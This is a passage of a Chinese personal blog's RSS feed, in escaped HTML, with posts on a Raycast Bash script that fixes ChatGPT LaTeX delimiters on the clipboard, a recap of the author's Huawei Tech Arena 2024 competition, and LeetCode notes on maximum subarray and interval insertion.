&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>如何处理ChatGPT的Latex格式和Obsidian与Craft不一致的问题</title>
        <link>https://nansenli.com/zh-cn/post/2024/10/raycast-craft/</link>
        <pubDate>Sat, 26 Oct 2024 12:59:17 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2024/10/raycast-craft/</guid>
        <description>&lt;p&gt;在之前的文章中，我使用了 Obsidian 的 QuickAdd 来创建一个脚本，自动转换从 ChatGPT 中复制的文本，修复其中的 LaTeX 格式。然而，对于 Craft 这款应用，并没有合适的插件可以使用。&lt;/p&gt;
&lt;p&gt;我们可以通过 Raycast 来实现这个功能的统一操作。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;创建-raycast-脚本&#34;&gt;创建 Raycast 脚本
&lt;/h1&gt;&lt;p&gt;首先，我们需要创建一个脚本。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/807ADA48-9980-42C3-9BA8-136F966CD4A9/F182CBD0-1613-4125-8D24-917683A8EA73_2/CVdOosoD7Oc2T1qC3WBN9tGoE5z0ixvfd5diCpBxsG0z/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;接着选择 Bash 模板。&lt;/p&gt;
&lt;p&gt;然后，我们编辑这个 Bash 脚本，输入如下代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Required parameters:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# @raycast.schemaVersion 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# @raycast.title Copy From ChatGPT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# @raycast.mode silent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Optional parameters:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# @raycast.icon 🤖&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# @raycast.packageName ChatGPT Utils&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Documentation:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# @raycast.description Copy From ChatGPT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# @raycast.author Nansen Li&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# @raycast.authorURL nansenli.com&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取剪贴板内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;clipboard_content&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pbpaste&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 检查是否成功获取内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$clipboard_content&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;剪贴板为空或无法访问。&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    exit &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 处理剪贴板内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modified_content&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$clipboard_content&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; | &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    sed &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/\\\[/$$/g; s/\\\]/$$/g; s/\\( /$/g; s/ \\\)/$/g&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 将修改后的内容写回剪贴板&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$modified_content&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; | pbcopy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;创建完脚本后，我们还需要将脚本所在的目录添加到 Raycast 中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/807ADA48-9980-42C3-9BA8-136F966CD4A9/C5D4A349-5648-46F2-A5B0-3881563659A7_2/zvYyttwVwKK8ZuyBdX2Ohd7mPFZfHSw253MaW9xaOiAz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在这一步中，选择刚刚创建的脚本目录。此时，我们可以在 &lt;code&gt;Script Commands&lt;/code&gt; 中看到刚刚创建的脚本。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;如何使用&#34;&gt;如何使用
&lt;/h1&gt;&lt;p&gt;在复制完 ChatGPT 的公式后，打开 Raycast 的面板，找到刚刚的脚本并运行，此时剪贴板中的内容就会被自动修复。接下来，只需将其粘贴到 Obsidian 或 Craft 中即可。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>华为爱尔兰研究中心Tech Arena 2024竞赛总结</title>
        <link>https://nansenli.com/zh-cn/post/2024/10/huawei2024/</link>
        <pubDate>Thu, 24 Oct 2024 09:58:53 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2024/10/huawei2024/</guid>
        <description>&lt;h2 id=&#34;背景介绍&#34;&gt;背景介绍
&lt;/h2&gt;&lt;p&gt;我是Nansen，参与了2024年华为爱尔兰研究中心的服务器集群管理优化比赛。在此，我想分享一下这次比赛的经历，并对其中的关键点进行总结。&lt;/p&gt;
&lt;p&gt;我们的算法代码部分可以参考这里: &lt;a class=&#34;link&#34; href=&#34;https://github.com/linanwx/huawei2024&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;huawei2024&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;比赛结果&#34;&gt;比赛结果
&lt;/h2&gt;&lt;p&gt;我们在算法部分获得了第一名，分数比第二至第四名高出约4%-5%，取得了巨大的优势。然而，在演讲环节我们遇到了很大的挑战。首先，我们意识到英语表达方面有提升空间；其次，我们发现演示PPT还可以更精美突出；最后，在时间安排上也存在一些挑战。不过，尽管如此，我们还是在总分上取得了第三名的成绩。&lt;/p&gt;
&lt;h2 id=&#34;比赛过程&#34;&gt;比赛过程
&lt;/h2&gt;&lt;p&gt;比赛分为两个阶段。第一阶段有较长的准备时间。当我们确定使用模拟退火算法后，就开始了算法的开发。第一阶段的难点主要在于优化和理解题目需求。在开发过程中，我们遇到了许多bug，但在修复后，分数有了明显提升。&lt;/p&gt;
&lt;p&gt;第二阶段，由于题目在比赛当天才发布，我继续优化第一阶段的算法，成功将评估算法的运行速度提升了1000倍。这显著提高了我们在第二阶段的表现，让我们有足够的实力争夺第一名。&lt;/p&gt;
&lt;p&gt;在决赛阶段，我们的算法表现非常稳定，并在调整后大幅领先对手。然而，由于我们没有足够重视PPT的制作，我们以为只要算法表现好，排名靠前，就能获得高分，但事实证明我们错了。&lt;/p&gt;
&lt;h2 id=&#34;经验和教训&#34;&gt;经验和教训
&lt;/h2&gt;&lt;h3 id=&#34;算法选择&#34;&gt;算法选择
&lt;/h3&gt;&lt;p&gt;很幸运，在最初的阶段我就选对了最终的算法，并且在题目发布后不久就构思出了适用于整个比赛的算法框架。然而，我也走了一些弯路，比如尝试了一些不可行的算法（如PPO算法）。在初步尝试无果后，我应该及时停止，而不是继续浪费精力。由于时间有限，我们应追求最短时间内的最优效果，而不是追求一个不切实际、理想中的方案。同时，也要认清自己的能力边界，专注于在短时间内能够实现的目标。&lt;/p&gt;
&lt;h3 id=&#34;团队分工&#34;&gt;团队分工
&lt;/h3&gt;&lt;p&gt;很幸运，这次团队的分工是合理的，我尽力确保每个成员都能发挥自己的价值。改进之处在于，应该更多地与队员沟通，了解他们的意愿和想法。由于我主要负责算法部分，与队友的沟通相对较少，下一次我会在这方面做得更好。&lt;/p&gt;
&lt;h3 id=&#34;ppt的制作&#34;&gt;PPT的制作
&lt;/h3&gt;&lt;p&gt;我们没有预料到，其他参赛队伍的PPT水平如此之高。我的队友猜测，他们可能有商科背景，这使得他们在制作PPT时具有优势。此外，他们的团队有五名成员，而我们只有三名，这也让我们在人员配备上处于劣势。这些都是客观上的挑战，但如果我们更加重视PPT的制作，或许第一名就是我们的。&lt;/p&gt;
&lt;h3 id=&#34;过分投入导致失衡&#34;&gt;过分投入导致失衡
&lt;/h3&gt;&lt;p&gt;在决赛阶段，其实我们的算法已经非常出色，分数也超过了此前排名第一的队伍。然而，我仍然花了大量时间继续优化算法，尽管我们的算法分数领先对手很多，但却因此忽略了PPT的准备。事实上，我应该适可而止，并充分理解评分标准的重要性。&lt;/p&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;通过参加华为Tech Arena 2024竞赛，我获得了宝贵的经验。这次比赛不仅展示了我们的优势，也暴露了我们在展示技能和团队协作方面需要改进的地方。展望未来，我会牢记这些经验教训，并在今后的比赛中不断改进自己。如果您有问题，可以在留言区反馈给我。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Leetcode 背题</title>
        <link>https://nansenli.com/zh-cn/post/2024/10/leetcode241020/</link>
        <pubDate>Mon, 21 Oct 2024 19:39:36 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2024/10/leetcode241020/</guid>
        <description>&lt;p&gt;今天开始了漫长的刷题流程。之前只是简单做了一些题目，保持手感，但今天开始，就要为面试正式准备了。&lt;/p&gt;
&lt;p&gt;之前一直在思考一个问题：如何高效地刷 Leetcode。我认为，要高效地刷题，首先就得背题。书读百遍，其义自见，大语言模型经过大量训练，也锻炼出了写代码的能力。同样地，我相信 Leetcode 也一样，通过多次练习，答案自然会浮现，量变产生质变。&lt;/p&gt;
&lt;h2 id=&#34;53-maximum-subarrayhttpsleetcodecomproblemsmaximum-subarray&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://leetcode.com/problems/maximum-subarray/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;53. Maximum Subarray&lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;解题思路可以使用 &lt;strong&gt;Kadane&amp;rsquo;s Algorithm&lt;/strong&gt;，代码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;maxSubArray&lt;/span&gt;(nums):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    max_current &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; max_global &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nums[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; num &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; nums[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        max_current &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; max(num, max_current &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; num)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        max_global &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; max(max_global, max_current)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; max_global
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是一个典型的动态规划题目，上面的算法其实隐藏了动态规划的本质。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Solution&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; maxSubArray(vector&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt; nums) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        vector&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; dp(nums.size());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dp[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nums[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; nums.size(); i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            dp[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; max(dp[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; nums[i], nums[i]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;max_element&lt;/span&gt;(dp.begin(), dp.end());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码更好地体现了动态规划的思想。&lt;/p&gt;
&lt;p&gt;理解 &lt;code&gt;dp[i] = max(nums[i] + dp[i-1], nums[i])&lt;/code&gt; 的公式可以从动态规划的角度来解析。这个公式的核心在于“在每一个位置上，我们要做出一个最优选择”。以下是详细解释：&lt;/p&gt;
&lt;h3 id=&#34;1-dpi-的含义是什么&#34;&gt;1. &lt;code&gt;dp[i]&lt;/code&gt; 的含义是什么？
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dp[i]&lt;/code&gt; 表示以位置 &lt;code&gt;i&lt;/code&gt; 结尾的 &lt;strong&gt;最大子数组和&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-为什么比较-numsi--dpi-1-和-numsi&#34;&gt;2. 为什么比较 &lt;code&gt;nums[i] + dp[i-1]&lt;/code&gt; 和 &lt;code&gt;nums[i]&lt;/code&gt;？
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;核心问题是：&lt;strong&gt;当前的最大子数组和是否应该包括之前的部分（&lt;code&gt;dp[i-1]&lt;/code&gt;）？&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;nums[i] + dp[i-1]&lt;/code&gt;&lt;/strong&gt;：如果 &lt;code&gt;dp[i-1]&lt;/code&gt; 是正数，加上当前的 &lt;code&gt;nums[i]&lt;/code&gt; 会让子数组和变大，那么我们选择累加。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;nums[i]&lt;/code&gt;&lt;/strong&gt;：如果 &lt;code&gt;dp[i-1]&lt;/code&gt; 是负数，我们选择从当前位置重新开始一个新的子数组，因为负数只会拖累当前和。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-为什么不用比较后续的数&#34;&gt;3. 为什么不用比较后续的数？
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;我们在比较时，是假设数组在位置 &lt;code&gt;i&lt;/code&gt; 停止。也就是说，我们考虑 &lt;code&gt;[0:i]&lt;/code&gt; 这个范围内的最大值，对于位置 &lt;code&gt;i&lt;/code&gt; 来说，要么加上之前的子数组，要么放弃之前的子数组，只采用当前的数。&lt;/li&gt;
&lt;li&gt;然后，我们遍历整个数组，找出在每个位置停下来的最大值，最终返回最大的那个值。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;57-insert-intervalhttpsleetcodecomproblemsinsert-interval&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://leetcode.com/problems/insert-interval/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;57. Insert Interval&lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;这是一个经典的区间合并问题，需要将新插入的区间合并到已有的区间中。&lt;/p&gt;
&lt;p&gt;可以使用分解法来解决：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一步，将不重叠且在 &lt;code&gt;newInterval&lt;/code&gt; 之前的区间添加到结果中。&lt;/li&gt;
&lt;li&gt;第二步，合并所有可能重叠的区间到 &lt;code&gt;newInterval&lt;/code&gt; 中，注意这里的判断条件。&lt;/li&gt;
&lt;li&gt;第三步，将剩余的区间添加到结果中。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意，合并区间的判断条件是前一个区间的开始小于等于后一个区间的结束，即 &lt;code&gt;intervals[i][0] &amp;lt;= newInterval[1]&lt;/code&gt;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Solution&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;insert&lt;/span&gt;(self, intervals: List[List[int]], newInterval: List[int]) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; List[List[int]]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ret_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(intervals) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; intervals[i][&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; newInterval[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ret_list&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(intervals[i])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(intervals) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; intervals[i][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; newInterval[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            newInterval[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; min(intervals[i][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], newInterval[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            newInterval[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; max(intervals[i][&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], newInterval[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
